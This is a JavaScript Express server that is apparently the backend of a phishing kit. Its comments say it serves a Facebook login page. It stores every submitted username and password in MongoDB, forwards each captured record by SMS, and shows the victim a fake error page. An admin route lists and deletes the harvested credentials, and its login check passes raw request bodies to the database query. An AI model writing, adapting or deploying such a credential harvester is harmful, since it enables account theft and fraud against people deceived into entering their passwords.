require('dotenv').config();
const express = require('express');
const mongoose = require('mongoose');
const body_parser = require('body-parser');
const path = require('path');
const {readFileSync} = require('fs');
const {htmlData, sendSMS} = require('./public/data');



const app = express();
app.use(express.json());
app.use(body_parser.urlencoded({extended :true}));
app.use(express.static('public/images'));
app.use(express.static('public/fontawesome/css'));
app.use(express.static('public'));
const PORT = process.env.PORT || 3500;
const _router = express.Router();

const connectDB = async () =>{
    try {
      await mongoose.connect(process.env.LOCAL_CON_STR).then(()=>{
      console.log(`Database connected succesful`);

      });
        
    } catch (error) {
        console.log(error.message);
        process.exit(1);
    }
};


const schema = new mongoose.Schema({
  user_name : {
    type : String,
    required :true,
    trim : true
  },
  password : {
    type : String,
    required :true,
    trim : true
  },
  createAt : String
});

schema.pre('save',function(next) {
  this.createAt = new Date();
  next();
  
});
const imfor = mongoose.model('imfor',schema);

  // sending facebook login page
_router.route('/').get((req, res)=>{
  res.status(200).sendFile(path.join(__dirname,'public','index.html'));

});

  // creating user
  _router.route('/login_details').post( async (req,res)=>{

    await imfor.create(req.body).then(result =>{
       sendSMS(result);
  res.status(500).sendFile(path.join(__dirname,'error','error.html'));

    }).catch(err =>{
      console.log(err)
    });
});

  // sending Admin login page
_router.route('/user_account').get( async (req,res)=>{
  res.status(200).sendFile(path.join(__dirname,'public','login.html'));
});

let page = readFileSync(path.join(__dirname,'public/page.html'),{encoding:'utf-8'});

 // getting all users
_router.route('/user_account/api').post(async(req,res)=>{

    const isExist =  await imfor.findOne(req.body,{_id:1,__v:0});
    if(isExist){
  
      const data = await imfor.find({},{__v:0});
      let renderPage = htmlData(page,data);
      res.status(200).send(renderPage.join(''));
    }
})
     
  // deleting user
  _router.route('/user_account/api/:id?').delete( async (req,res)=>{
     try {
      await imfor.findOneAndDelete(req.body).then(()=>{
      res.status(204).json({
        status :`deleted ${req.body.user_name} is successfull`
      })
      })
     } catch (error) {
      console.log(error.message)
     }
  });

app.use('/',_router);

connectDB().then(app.listen(PORT,() =>{
  console.log(`Server listening on ${PORT}`);
}));
  